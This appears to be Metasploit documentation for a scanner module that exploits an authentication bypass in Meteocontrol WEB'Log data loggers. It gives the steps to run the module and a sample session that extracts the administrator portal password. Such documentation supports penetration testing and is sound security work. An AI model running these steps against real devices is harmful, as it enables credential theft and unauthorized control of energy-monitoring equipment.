Meteocontrol WEB'Log Data Loggers are affected with an authentication bypass vulnerability.
The module exploits this vulnerability to remotely extract Administrator password for the device management portal.

Note: In some versions, 'Website password' page is renamed or not present. Therefore, password can not be extracted. Manual verification will be required in such cases.

## Verification Steps

1. Do: ```use auxiliary/scanner/http/meteocontrol_weblog_extractadmin```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```run```

## Scenarios

  ```
msf > use auxiliary/scanner/http/meteocontrol_weblog_extractadmin
msf auxiliary(meteocontrol_weblog_extractadmin) > set rhosts 1.2.3.4
msf auxiliary(meteocontrol_weblog_extractadmin) > run

[+] 1.2.3.4:8080 - Running Meteocontrol WEBlog management portal...
[*] 1.2.3.4:8080 - Attempting to extract Administrator password...
[+] 1.2.3.4:8080 - Password is password
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
  ```
